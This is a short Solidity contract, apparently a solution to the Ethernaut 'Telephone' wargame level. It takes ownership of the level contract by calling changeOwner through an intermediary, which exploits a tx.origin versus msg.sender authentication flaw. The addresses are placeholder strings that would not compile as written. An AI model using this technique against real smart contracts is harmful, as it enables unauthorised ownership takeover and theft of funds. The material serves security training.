// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Attack {

    address level_addr = "Instance address";
    address my_account = "The account you connect to Ethernaut";
    
    // use this contract to call our target contract, so `msg.sender` will be the former and `tx.origon` will be our wallet account.
    function callChangeOwner() external { 
        ITelephone(level_addr).changeOwner(my_account);
    }
}
